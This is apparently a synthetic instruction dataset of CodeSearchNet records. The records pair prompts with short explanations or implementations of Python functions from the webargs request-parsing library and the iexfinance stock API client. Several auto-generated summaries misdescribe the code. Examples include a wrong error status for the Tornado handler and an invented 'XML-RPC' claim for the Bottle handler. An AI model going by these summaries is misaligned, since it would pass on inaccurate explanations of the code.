{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef handle_error(self, error, req, schema, error_status_code, error_headers):\n        status_code = error_status_code or self.DEFAULT_VALIDATION_STATUS\n        if status_code == 422:\n            reason = \"Unprocessable Entity\"\n        else:\n            reason = None\n        raise HTTPError(\n            status_code,\n            log_message=str(error.messages),\n            reason=reason,\n            messages=error.messages,\n            headers=error_headers,\n        )", "response": "Handles errors during parsing. Raises a tornado. web. HTTPError with a 400 error."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\npulls a querystring value from the request.", "response": "def parse_querystring(self, req, name, field):\n        \"\"\"Pull a querystring value from the request.\"\"\"\n        return core.get_value(req.GET, name, field)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef parse_form(self, req, name, field):\n        return core.get_value(req.POST, name, field)", "response": "Pull a form value from the request."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef parse_json(self, req, name, field):\n        json_data = self._cache.get(\"json\")\n        if json_data is None:\n            try:\n                self._cache[\"json\"] = json_data = core.parse_json(req.body, req.charset)\n            except json.JSONDecodeError as e:\n                if e.doc == \"\":\n                    return core.missing\n                else:\n                    return self.handle_invalid_json_error(e, req)\n            if json_data is None:\n                return core.missing\n        return core.get_value(json_data, name, field, allow_many_nested=True)", "response": "Pull a json value from the request."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef parse_cookies(self, req, name, field):\n        return core.get_value(req.cookies, name, field)", "response": "Pull the value from the cookiejar."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\npulls a file from the request.", "response": "def parse_files(self, req, name, field):\n        \"\"\"Pull a file from the request.\"\"\"\n        files = ((k, v) for k, v in req.POST.items() if hasattr(v, \"file\"))\n        return core.get_value(MultiDict(files), name, field)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef parse_matchdict(self, req, name, field):\n        return core.get_value(req.matchdict, name, field)", "response": "Pull a value from the request s matchdict."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nhandle errors during parsing. Aborts the current HTTP request and responds with a 400 error.", "response": "def handle_error(self, error, req, schema, error_status_code, error_headers):\n        \"\"\"Handles errors during parsing. Aborts the current HTTP request and\n        responds with a 400 error.\n        \"\"\"\n        status_code = error_status_code or self.DEFAULT_VALIDATION_STATUS\n        response = exception_response(\n            status_code,\n            detail=text_type(error),\n            headers=error_headers,\n            content_type=\"application/json\",\n        )\n        body = json.dumps(error.messages)\n        response.body = body.encode(\"utf-8\") if isinstance(body, text_type) else body\n        raise response"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef use_args(\n        self,\n        argmap,\n        req=None,\n        locations=core.Parser.DEFAULT_LOCATIONS,\n        as_kwargs=False,\n        validate=None,\n        error_status_code=None,\n        error_headers=None,\n    ):\n        \"\"\"Decorator that injects parsed arguments into a view callable.\n        Supports the *Class-based View* pattern where `request` is saved as an instance\n        attribute on a view class.\n\n        :param dict argmap: Either a `marshmallow.Schema`, a `dict`\n            of argname -> `marshmallow.fields.Field` pairs, or a callable\n            which accepts a request and returns a `marshmallow.Schema`.\n        :param req: The request object to parse. Pulled off of the view by default.\n        :param tuple locations: Where on the request to search for values.\n        :param bool as_kwargs: Whether to insert arguments as keyword arguments.\n        :param callable validate: Validation function that receives the dictionary\n            of parsed arguments. If the function returns ``False``, the parser\n            will raise a :exc:`ValidationError`.\n        :param int error_status_code: Status code passed to error handler functions when\n            a `ValidationError` is raised.\n        :param dict error_headers: Headers passed to error handler functions when a\n            a `ValidationError` is raised.\n        \"\"\"\n        locations = locations or self.locations\n        # Optimization: If argmap is passed as a dictionary, we only need\n        # to generate a Schema once\n        if isinstance(argmap, collections.Mapping):\n            argmap = core.dict2schema(argmap, self.schema_class)()\n\n        def decorator(func):\n            @functools.wraps(func)\n            def wrapper(obj, *args, **kwargs):\n                # The first argument is either `self` or `request`\n                try:  # get self.request\n                    request = req or obj.request\n                except AttributeError:  # first arg is request\n                    request = obj\n                # NOTE: At this point, argmap may be a Schema, callable, or dict\n                parsed_args = self.parse(\n                    argmap,\n                    req=request,\n                    locations=locations,\n                    validate=validate,\n                    error_status_code=error_status_code,\n                    error_headers=error_headers,\n                )\n                if as_kwargs:\n                    kwargs.update(parsed_args)\n                    return func(obj, *args, **kwargs)\n                else:\n                    return func(obj, parsed_args, *args, **kwargs)\n\n            wrapper.__wrapped__ = func\n            return wrapper\n\n        return decorator", "response": "Decorator that returns a function that will parse the arguments of the view class with the given argmap."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nraising a HTTPException for the given http_status_code.", "response": "def abort(http_status_code, exc=None, **kwargs):\n    \"\"\"Raise a HTTPException for the given http_status_code. Attach any keyword\n    arguments to the exception for later processing.\n\n    From Flask-Restful. See NOTICE file for license information.\n    \"\"\"\n    try:\n        flask.abort(http_status_code)\n    except HTTPException as err:\n        err.data = kwargs\n        err.exc = exc\n        raise err"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef parse_view_args(self, req, name, field):\n        return core.get_value(req.view_args, name, field)", "response": "Pull a value from the request s view_args."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef parse_querystring(self, req, name, field):\n        return core.get_value(req.args, name, field)", "response": "Pull a querystring value from the request."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\npulls a form value from the request.", "response": "def parse_form(self, req, name, field):\n        \"\"\"Pull a form value from the request.\"\"\"\n        try:\n            return core.get_value(req.form, name, field)\n        except AttributeError:\n            pass\n        return core.missing"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nhandles errors during parsing. Aborts the current HTTP request and responds with a 422 error.", "response": "def handle_error(self, error, req, schema, error_status_code, error_headers):\n        \"\"\"Handles errors during parsing. Aborts the current HTTP request and\n        responds with a 422 error.\n        \"\"\"\n        status_code = error_status_code or self.DEFAULT_VALIDATION_STATUS\n        abort(\n            status_code,\n            exc=error,\n            messages=error.messages,\n            schema=schema,\n            headers=error_headers,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\npull the value from the cookiejar.", "response": "def parse_cookies(self, req, name, field):\n        \"\"\"Pull the value from the cookiejar.\"\"\"\n        return core.get_value(req.COOKIES, name, field)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef parse_files(self, req, name, field):\n        return core.get_value(req.FILES, name, field)", "response": "Pull a file from the request."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef route(*args, response_formatter=jsonify, **kwargs):\n\n    def decorator(func):\n        @app.route(*args, **kwargs)\n        @functools.wraps(func)\n        def wrapped_view(*a, **kw):\n            annotations = getattr(func, \"__annotations__\", {})\n            reqargs = {\n                name: value\n                for name, value in annotations.items()\n                if isinstance(value, fields.Field) and name != \"return\"\n            }\n            response_schema = annotations.get(\"return\")\n            parsed = parser.parse(reqargs, request)\n            kw.update(parsed)\n            response_data = func(*a, **kw)\n            if response_schema:\n                return response_formatter(response_schema.dump(response_data).data)\n            else:\n                return response_formatter(func(*a, **kw))\n\n        return wrapped_view\n\n    return decorator", "response": "Decorator for Flask. route that parses the request and returns the response."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef write_error(self, status_code, **kwargs):\n        self.set_header(\"Content-Type\", \"application/json\")\n        if \"exc_info\" in kwargs:\n            etype, exc, traceback = kwargs[\"exc_info\"]\n            if hasattr(exc, \"messages\"):\n                self.write({\"errors\": exc.messages})\n                if getattr(exc, \"headers\", None):\n                    for name, val in exc.headers.items():\n                        self.set_header(name, val)\n                self.finish()", "response": "Write errors as JSON."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef to_dict(self, *args, **kwargs):\n        ret = super(HTTPError, self).to_dict(*args, **kwargs)\n        if self.errors is not None:\n            ret[\"errors\"] = self.errors\n        return ret", "response": "Override falcon. HTTPResponse to include error messages in responses."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef parse_querystring(self, req, name, field):\n        return core.get_value(req.params, name, field)", "response": "Pull a querystring value from the request."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef parse_form(self, req, name, field):\n        form = self._cache.get(\"form\")\n        if form is None:\n            self._cache[\"form\"] = form = parse_form_body(req)\n        return core.get_value(form, name, field)", "response": "Parse a form value from the request."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef parse_headers(self, req, name, field):\n        # Use req.get_headers rather than req.headers for performance\n        return req.get_header(name, required=False) or core.missing", "response": "Pull a header value from the request."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\npull a cookie value from the request.", "response": "def parse_cookies(self, req, name, field):\n        \"\"\"Pull a cookie value from the request.\"\"\"\n        cookies = self._cache.get(\"cookies\")\n        if cookies is None:\n            self._cache[\"cookies\"] = cookies = req.cookies\n        return core.get_value(cookies, name, field)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_request_from_view_args(self, view, args, kwargs):\n        req = args[1]\n        assert isinstance(req, falcon.Request), \"Argument is not a falcon.Request\"\n        return req", "response": "Get request from a resource method s arguments. Assumes that the request is the second argument."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nhandles errors during parsing.", "response": "def handle_error(self, error, req, schema, error_status_code, error_headers):\n        \"\"\"Handles errors during parsing.\"\"\"\n        status = status_map.get(error_status_code or self.DEFAULT_VALIDATION_STATUS)\n        if status is None:\n            raise LookupError(\"Status code {0} not supported\".format(error_status_code))\n        raise HTTPError(status, errors=error.messages, headers=error_headers)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\nasync def parse(\n        self,\n        argmap: ArgMap,\n        req: Request = None,\n        locations: typing.Iterable = None,\n        validate: Validate = None,\n        error_status_code: typing.Union[int, None] = None,\n        error_headers: typing.Union[typing.Mapping[str, str], None] = None,\n    ) -> typing.Union[typing.Mapping, None]:\n        \"\"\"Coroutine variant of `webargs.core.Parser`.\n\n        Receives the same arguments as `webargs.core.Parser.parse`.\n        \"\"\"\n        self.clear_cache()  # in case someone used `parse_*()`\n        req = req if req is not None else self.get_default_request()\n        assert req is not None, \"Must pass req object\"\n        data = None\n        validators = core._ensure_list_of_callables(validate)\n        schema = self._get_schema(argmap, req)\n        try:\n            parsed = await self._parse_request(\n                schema=schema, req=req, locations=locations or self.locations\n            )\n            result = schema.load(parsed)\n            data = result.data if core.MARSHMALLOW_VERSION_INFO[0] < 3 else result\n            self._validate_arguments(data, validators)\n        except ma.exceptions.ValidationError as error:\n            await self._on_validation_error(\n                error, req, schema, error_status_code, error_headers\n            )\n        return data", "response": "Coroutine variant of webargs. core. Parser. parse."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\npull a querystring value from the request.", "response": "def parse_querystring(self, req: Request, name: str, field: Field) -> typing.Any:\n        \"\"\"Pull a querystring value from the request.\"\"\"\n        return core.get_value(req.query, name, field)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\nasync def parse_form(self, req: Request, name: str, field: Field) -> typing.Any:\n        post_data = self._cache.get(\"post\")\n        if post_data is None:\n            self._cache[\"post\"] = await req.post()\n        return core.get_value(self._cache[\"post\"], name, field)", "response": "Pull a form value from the request."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\nasync def parse_json(self, req: Request, name: str, field: Field) -> typing.Any:\n        json_data = self._cache.get(\"json\")\n        if json_data is None:\n            if not (req.body_exists and is_json_request(req)):\n                return core.missing\n            try:\n                json_data = await req.json(loads=json.loads)\n            except json.JSONDecodeError as e:\n                if e.doc == \"\":\n                    return core.missing\n                else:\n                    return self.handle_invalid_json_error(e, req)\n            self._cache[\"json\"] = json_data\n        return core.get_value(json_data, name, field, allow_many_nested=True)", "response": "Pull a json value from the request."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef parse_headers(self, req: Request, name: str, field: Field) -> typing.Any:\n        return core.get_value(req.headers, name, field)", "response": "Pull a value from the header data."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef parse_cookies(self, req: Request, name: str, field: Field) -> typing.Any:\n        return core.get_value(req.cookies, name, field)", "response": "Pull a value from the cookiejar."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\npull a value from the request s match_info dictionary.", "response": "def parse_match_info(self, req: Request, name: str, field: Field) -> typing.Any:\n        \"\"\"Pull a value from the request's ``match_info``.\"\"\"\n        return core.get_value(req.match_info, name, field)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting request object from a view function or method. Used internally by use_args and use_kwargs.", "response": "def get_request_from_view_args(\n        self, view: typing.Callable, args: typing.Iterable, kwargs: typing.Mapping\n    ) -> Request:\n        \"\"\"Get request object from a handler function or method. Used internally by\n        ``use_args`` and ``use_kwargs``.\n        \"\"\"\n        req = None\n        for arg in args:\n            if isinstance(arg, web.Request):\n                req = arg\n                break\n            elif isinstance(arg, web.View):\n                req = arg.request\n                break\n        assert isinstance(req, web.Request), \"Request argument not found for handler\"\n        return req"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nhandle validation errors and return a JSON response of the error messages.", "response": "def handle_error(\n        self,\n        error: ValidationError,\n        req: Request,\n        schema: Schema,\n        error_status_code: typing.Union[int, None] = None,\n        error_headers: typing.Union[typing.Mapping[str, str], None] = None,\n    ) -> \"typing.NoReturn\":\n        \"\"\"Handle ValidationErrors and return a JSON response of error messages\n        to the client.\n        \"\"\"\n        error_class = exception_map.get(\n            error_status_code or self.DEFAULT_VALIDATION_STATUS\n        )\n        if not error_class:\n            raise LookupError(\"No exception for {0}\".format(error_status_code))\n        headers = error_headers\n        raise error_class(\n            body=json.dumps(error.messages).encode(\"utf-8\"),\n            headers=headers,\n            content_type=\"application/json\",\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\npull a querystring value from the request.", "response": "def parse_querystring(self, req, name, field):\n        \"\"\"Pull a querystring value from the request.\"\"\"\n        return core.get_value(req.query, name, field)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\npulling a form value from the request.", "response": "def parse_form(self, req, name, field):\n        \"\"\"Pull a form value from the request.\"\"\"\n        return core.get_value(req.forms, name, field)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nhandles errors during parsing. Raises bottle. HTTPError if the error is not a valid XML - RPC response.", "response": "def handle_error(self, error, req, schema, error_status_code, error_headers):\n        \"\"\"Handles errors during parsing. Aborts the current request with a\n        400 error.\n        \"\"\"\n        status_code = error_status_code or self.DEFAULT_VALIDATION_STATUS\n        raise bottle.HTTPError(\n            status=status_code,\n            body=error.messages,\n            headers=error_headers,\n            exception=error,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef use_schema(schema, list_view=False, locations=None):\n\n    def decorator(func):\n        @functools.wraps(func)\n        def wrapped(*args, **kwargs):\n            use_args_wrapper = parser.use_args(schema, locations=locations)\n            # Function wrapped with use_args\n            func_with_args = use_args_wrapper(func)\n            ret = func_with_args(*args, **kwargs)\n            # Serialize and jsonify the return value\n            return jsonify(schema.dump(ret, many=list_view).data)\n\n        return wrapped\n\n    return decorator", "response": "Decorator for using a marshmallow schema to generate a list of objects."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef handle_request_parsing_error(err, req, schema, error_status_code, error_headers):\n    abort(error_status_code, errors=err.messages)", "response": "This function is used to handle parsing errors in the request."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsanitizing start and end dates for .", "response": "def _sanitize_dates(start, end):\r\n    \"\"\"\r\n    Return (datetime_start, datetime_end) tuple\r\n    if start is None - default is 2015/01/01\r\n    if end is None - default is today\r\n    \"\"\"\r\n    if isinstance(start, int):\r\n        # regard int as year\r\n        start = datetime(start, 1, 1)\r\n    start = to_datetime(start)\r\n\r\n    if isinstance(end, int):\r\n        end = datetime(end, 1, 1)\r\n    end = to_datetime(end)\r\n\r\n    if start is None:\r\n        start = datetime(2015, 1, 1)\r\n    if end is None:\r\n        end = datetime.today()\r\n    if start > end:\r\n        raise ValueError('start must be an earlier date than end')\r\n    return start, end"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_social_sentiment(symbol, period_type=None, date=None, **kwargs):\n    import warnings\n    warnings.warn(\"UNSTABLE ENDPOINT: Not yet fully implemented by the \"\n                  \"provider.\")\n    return SocialSentiment(symbol, period_type, date, **kwargs).fetch()", "response": "This endpoint provides social sentiment data from StockTwits."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn all endpoints indexed by endpoint title for each symbol", "response": "def get_all(self):\r\n        \"\"\"\r\n        Returns all endpoints, indexed by endpoint title for each symbol\r\n\r\n        Notes\r\n        -----\r\n        Only allows JSON format (pandas not supported).\r\n        \"\"\"\r\n        self.optional_params = {}\r\n        self.endpoints = self._ENDPOINTS[:10]\r\n        json_data = self.fetch(fmt_p=no_pandas)\r\n        self.endpoints = self._ENDPOINTS[10:20]\r\n        json_data_2 = self.fetch(fmt_p=no_pandas)\r\n        for symbol in self.symbols:\r\n            if symbol not in json_data:\r\n                raise IEXSymbolError(symbol)\r\n            json_data[symbol].update(json_data_2[symbol])\r\n        return json_data[self.symbols[0]] if self.n_symbols == 1 else json_data"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a list of unique endpoints for the given set of symbols.", "response": "def get_endpoints(self, endpoints=[]):\r\n        \"\"\"\r\n        Universal selector method to obtain specific endpoints from the\r\n        data set.\r\n\r\n        Parameters\r\n        ----------\r\n        endpoints: str or list\r\n            Desired valid endpoints for retrieval\r\n\r\n        Notes\r\n        -----\r\n        Only allows JSON format (pandas not supported).\r\n\r\n        Raises\r\n        ------\r\n        IEXEndpointError\r\n            If an invalid endpoint is specified\r\n        IEXSymbolError\r\n            If a symbol is invalid\r\n        IEXQueryError\r\n            If issues arise during query\r\n        \"\"\"\r\n        if isinstance(endpoints, str) and endpoints in self._ENDPOINTS:\r\n            endpoints = list(endpoints)\r\n        if not endpoints or not set(endpoints).issubset(self._ENDPOINTS):\r\n            raise IEXEndpointError(\"Please provide a valid list of endpoints\")\r\n        elif len(endpoints) > 10:\r\n            raise ValueError(\"Please input up to 10 valid endpoints\")\r\n        self.optional_params = {}\r\n        self.endpoints = endpoints\r\n        json_data = self.fetch(fmt_p=no_pandas)\r\n        for symbol in self.symbols:\r\n            if symbol not in json_data:\r\n                raise IEXSymbolError(symbol)\r\n        return json_data[self.symbols[0]] if self.n_symbols == 1 else json_data"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_balance_sheet(self, **kwargs):\r\n        def fmt_p(out):\r\n            data = {(symbol, sheet[\"reportDate\"]): sheet for symbol in out\r\n                    for sheet in out[symbol][\"balancesheet\"]}\r\n            return pd.DataFrame(data)\r\n\r\n        return self._get_endpoint(\"balance-sheet\", fmt_p=fmt_p, params=kwargs)", "response": "Returns a DataFrame containing the latest set of annual and quarterly balance sheets."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_fund_ownership(self, **kwargs):\r\n        def fmt_p(out):\r\n            out = {(symbol, owner[\"entityProperName\"]): owner\r\n                   for symbol in out\r\n                   for owner in out[symbol]}\r\n            return pd.DataFrame(out)\r\n\r\n        return self._get_endpoint(\"fund-ownership\", fmt_p=fmt_p, params=kwargs)", "response": "Returns a list of Stocks Fund Ownership objects."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_historical_prices(self, **kwargs):\r\n        def fmt_p(out):\r\n            result = {}\r\n            for symbol in self.symbols:\r\n                d = out.pop(symbol)\r\n                df = pd.DataFrame(d)\r\n                df.set_index(pd.DatetimeIndex(df[\"date\"]), inplace=True)\r\n                values = [\"open\", \"high\", \"low\", \"close\", \"volume\"]\r\n                df = df[values]\r\n                result.update({symbol: df})\r\n            if len(result) == 1:\r\n                return result[self.symbols[0]]\r\n            else:\r\n                return pd.concat(result.values(), keys=result.keys(), axis=1)\r\n\r\n        return self._get_endpoint(\"chart\", fmt_p=fmt_p, params=kwargs)", "response": "Returns a list of historical prices for the given date and time."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a list of Stocks Income Statement data.", "response": "def get_income_statement(self, **kwargs):\r\n        \"\"\"Income Statement\r\n\r\n        Pulls income statement data. Available quarterly (4 quarters) or\r\n        annually (4 years).\r\n\r\n        Reference: https://iexcloud.io/docs/api/#income-statement\r\n\r\n        Data Weighting: ``1000`` per symbol per period\r\n\r\n        .. warning:: This endpoint is only available using IEX Cloud. See\r\n                 :ref:`Migrating` for more information.\r\n\r\n        Parameters\r\n        ----------\r\n        period: str, default 'quarterly', optional\r\n             Allows you to specify annual or quarterly income statement.\r\n             Defaults to quarterly. Values should be annual or quarter\r\n\r\n        Returns\r\n        -------\r\n        list or pandas.DataFrame\r\n            Stocks Income Statement endpoint data\r\n        \"\"\"\r\n        def fmt(out):\r\n            return {symbol: out[symbol][\"income\"]\r\n                    for symbol in self.symbols}\r\n\r\n        def fmt_p(out):\r\n            data = {(symbol, sheet[\"reportDate\"]): sheet for symbol in out\r\n                    for sheet in out[symbol][\"income\"]}\r\n            return pd.DataFrame(data)\r\n\r\n        return self._get_endpoint(\"income\", fmt_j=fmt, fmt_p=fmt_p,\r\n                                  params=kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the most recent insiders in the roster.", "response": "def get_insider_roster(self):\r\n        \"\"\"Insider Roster\r\n\r\n        Returns the top 10 insiders, with the most recent information.\r\n\r\n        Reference: https://iexcloud.io/docs/api/#insider-roster\r\n\r\n        Data Weighting: ``5000`` per symbol\r\n\r\n        Returns\r\n        -------\r\n        list or pandas.DataFrame\r\n            Stocks Insider Roster Endpoint data\r\n        \"\"\"\r\n        def fmt_p(out):\r\n            out = {(symbol, owner[\"entityName\"]): owner\r\n                   for symbol in out\r\n                   for owner in out[symbol]}\r\n            return pd.DataFrame(out)\r\n\r\n        return self._get_endpoint(\"insider-roster\", fmt_p=fmt_p)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_previous(self, **kwargs):\r\n        import warnings\r\n        warnings.warn(\"get_previous has been renamed get_previous_day_prices \"\r\n                      \"and will be deprecated in v0.4.1\")\r\n        return self._get_endpoint(\"previous\", params=kwargs)", "response": "Returns the previous entry for the given time range."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a pandas. DataFrame containing the price data for the most recent Stocks Price.", "response": "def get_price(self, **kwargs):\r\n        \"\"\"Price\r\n\r\n        Reference: https://iexcloud.io/docs/api/#price\r\n\r\n        ``1`` per symbol\r\n\r\n        Returns\r\n        -------\r\n        float or pandas.DataFrame\r\n            Stocks Price endpoint data\r\n        \"\"\"\r\n        def fmt_p(out):\r\n            return pd.DataFrame(out, index=self.symbols)\r\n\r\n        return self._get_endpoint(\"price\", fmt_p=fmt_p, params=kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a dict of price targets for the given symbol.", "response": "def get_price_target(self, **kwargs):\r\n        \"\"\"Price Target\r\n\r\n        Provides the latest avg, high, and low analyst price target for a\r\n        symbol.\r\n\r\n        Reference: https://iexcloud.io/docs/api/#price-target\r\n\r\n        Data Weighting: ``500`` per symbol\r\n\r\n        .. warning:: This endpoint is only available using IEX Cloud. See\r\n                 :ref:`Migrating` for more information.\r\n\r\n        Returns\r\n        -------\r\n        dict or pandas.DataFrame\r\n            Latest average, high, and low price targets for a symbol\r\n        \"\"\"\r\n        def fmt_p(out):\r\n            if len(self.symbols) == 1:\r\n                return pd.DataFrame(out, index=self.symbols[0])\r\n            return pd.DataFrame(out)\r\n\r\n        return self._get_endpoint('price-target', params=kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a list of relevant items.", "response": "def get_relevant(self, **kwargs):\r\n        \"\"\"\r\n        DEPRECATED: Renamed ``get_relevant_stocks``\r\n        \"\"\"\r\n        import warnings\r\n        warnings.warn(\"get_relevant has been renamed get_relevant_stocks \"\r\n                      \"and will be deprecated in v0.4.1\")\r\n        return self._get_endpoint(\"relevant\", params=kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_stats_daily(start=None, end=None, last=None, **kwargs):\n    start, end = _sanitize_dates(start, end)\n    return DailySummaryReader(start=start, end=end, last=last,\n                              **kwargs).fetch()", "response": "This function returns daily stats for a given month or day."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_stats_summary(start=None, end=None, **kwargs):\n    return MonthlySummaryReader(start=start, end=end, **kwargs).fetch()", "response": "Returns the Stats Historical Summary of the current date range"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_market_gainers(*args, **kwargs):\r\n    import warnings\r\n    warnings.warn(WNG_MSG, (\"get_market_gainers\", \"stocks.get_market_gainers\"))\r\n    return stocks.get_market_gainers(*args, **kwargs)", "response": "MOVED to iexfinance. stocks. get_market_gainers"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nmoves to iexfinance. stocks. get_market_losers", "response": "def get_market_losers(*args, **kwargs):\r\n    \"\"\"\r\n    MOVED to iexfinance.stocks.get_market_losers\r\n    \"\"\"\r\n    import warnings\r\n    warnings.warn(WNG_MSG, (\"get_market_losers\", \"stocks.get_market_losers\"))\r\n    return stocks.get_market_losers(*args, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_market_most_active(*args, **kwargs):\r\n    import warnings\r\n    warnings.warn(WNG_MSG, (\"get_market_most_active\",\r\n                            \"stocks.get_market_most_active\"))\r\n    return stocks.get_market_most_active(*args, **kwargs)", "response": "MOVED to iexfinance. stocks. get_market_most_active"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_market_iex_volume(*args, **kwargs):\r\n    import warnings\r\n    warnings.warn(WNG_MSG, (\"get_market_iex_volume\",\r\n                            \"stocks.get_market_iex_volume\"))\r\n    return stocks.get_market_iex_volume(*args, **kwargs)", "response": "MOVED to iexfinance. stocks. get_market_iex_volume"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nmoving to iexfinance. stocks. get_market_iex_percent", "response": "def get_market_iex_percent(*args, **kwargs):\r\n    \"\"\"\r\n    MOVED to iexfinance.stocks.get_market_iex_percent\r\n    \"\"\"\r\n    import warnings\r\n    warnings.warn(WNG_MSG, (\"get_market_iex_percent\",\r\n                            \"stocks.get_market_iex_percent\"))\r\n    return stocks.get_market_iex_percent(*args, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_available_symbols(**kwargs):\r\n    import warnings\r\n    warnings.warn(WNG_MSG % (\"get_available_symbols\", \"refdata.get_symbols\"))\r\n    _ALL_SYMBOLS_URL = \"https://api.iextrading.com/1.0/ref-data/symbols\"\r\n    handler = _IEXBase(**kwargs)\r\n    response = handler._execute_iex_query(_ALL_SYMBOLS_URL)\r\n    if not response:\r\n        raise IEXQueryError(\"Could not download all symbols\")\r\n    else:\r\n        return response", "response": "MOVED to iexfinance. refdata. get_symbols"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_iex_corporate_actions(start=None, **kwargs):\r\n    import warnings\r\n    warnings.warn(WNG_MSG % (\"get_iex_corporate_actions\",\r\n                             \"refdata.get_iex_corporate_actions\"))\r\n    return CorporateActions(start=start, **kwargs).fetch()", "response": "MOVED to iexfinance. refdata. get_corporate_actions"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_iex_dividends(start=None, **kwargs):\r\n    import warnings\r\n    warnings.warn(WNG_MSG % (\"get_iex_dividends\", \"refdata.get_iex_dividends\"))\r\n    return Dividends(start=start, **kwargs).fetch()", "response": "MOVED to iexfinance. refdata. get_iex_dividends"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_iex_next_day_ex_date(start=None, **kwargs):\r\n    import warnings\r\n    warnings.warn(WNG_MSG % (\"get_iex_next_day_ex_date\",\r\n                             \"refdata.get_iex_next_day_ex_date\"))\r\n    return NextDay(start=start, **kwargs).fetch()", "response": "MOVED to iexfinance. refdata. get_next_day_ex_date"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_iex_listed_symbol_dir(start=None, **kwargs):\r\n    import warnings\r\n    warnings.warn(WNG_MSG % (\"get_iex_listed_symbol_dir\",\r\n                             \"refdata.get_iex_listed_symbol_dir\"))\r\n    return ListedSymbolDir(start=start, **kwargs)", "response": "Returns a list of symbols in the iexfinance. refdata. get_listed_symbol_dir"}
